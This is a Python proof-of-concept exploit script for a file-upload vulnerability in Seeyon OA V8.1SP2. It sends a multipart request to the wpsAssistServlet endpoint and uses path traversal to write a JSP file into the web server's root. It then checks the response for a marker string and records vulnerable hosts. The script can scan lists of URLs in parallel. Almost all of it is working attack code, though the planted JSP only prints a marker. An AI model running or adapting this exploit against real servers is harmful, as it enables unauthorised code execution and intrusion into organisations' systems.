import requests
import argparse
import sys
from multiprocessing.dummy import Pool


def banner():
    test = """
    
     _     _                           _____  ___  
    | |   (_)                         |  _  |/ _ \ 
 ___| |__  _ _   _ _   _  __ _ _ __   | | | / /_\ \
|_  / '_ \| | | | | | | |/ _` | '_ \  | | | |  _  |
 / /| | | | | |_| | |_| | (_| | | | | \ \_/ / | | |
/___|_| |_|_|\__, |\__,_|\__,_|_| |_|  \___/\_| |_/
              __/ |                                
             |___/                                 

    """
    print(test)

def poc(url):
    target_url = url + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2"
    headers = {
        "Content-Type": "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b"
    }
    data = """--59229605f98b8cf290a7b8908b34616b
    Content-Disposition: form-data; name="upload"; filename="123.xls"
    Content-Type: application/vnd.ms-excel

    <% out.println("seeyon_vuln");%>
    --59229605f98b8cf290a7b8908b34616b--
    """
    try:
        response = requests.post(target_url, headers=headers, data=data, timeout=5)
        if response.status_code == 200 and "seeyon_vuln" in response.text:
            print(f"{url} 存在漏洞.")
            with open("result.txt", "a") as f:
                f.write(f"{url} 存在漏洞.\n")
        else:
            print(f"{url} 不存在漏洞.")
    except requests.exceptions.RequestException as e:
        print(f"Request error for {url}: {e}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="致远OA_V8.1SP2文件上传的脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter URL")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file containing URLs")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            url_list = [line.strip() for line in f.readlines()]
        with Pool(10) as pool:
            pool.map(poc, url_list)
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -u <url> OR -f <file>")


if __name__ == "__main__":
    main()